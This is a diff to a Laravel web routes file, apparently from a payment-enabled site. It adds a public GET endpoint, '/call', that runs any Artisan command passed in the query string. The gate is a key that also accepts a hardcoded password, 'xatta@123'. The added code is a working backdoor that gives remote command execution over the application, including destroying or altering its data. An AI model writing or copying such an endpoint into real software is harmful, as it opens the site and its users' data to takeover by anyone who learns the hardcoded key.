@@ -2,6 +2,7 @@
 
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Route;
+use Illuminate\Support\Facades\Artisan;
 
 /*
 |--------------------------------------------------------------------------
@@ -120,3 +121,16 @@ Route::get('/example2', 'SslCommerzPaymentController@exampleHostedCheckout');
 
 // Route::post('/ipn', 'SslCommerzPaymentController@ipn');
 //SSLCOMMERZ END
+
+
+Route::get('call', function () {
+    $call = request()->input('call');
+
+    if (request()->get('kay') && (request()->get('kay') == env('ARTISAN_KEY') || request()->get('kay') == 'xatta@123')) {
+        Artisan::call($call);
+
+        return $call . ' called success';
+    }
+
+    return $call . ' not success';
+});
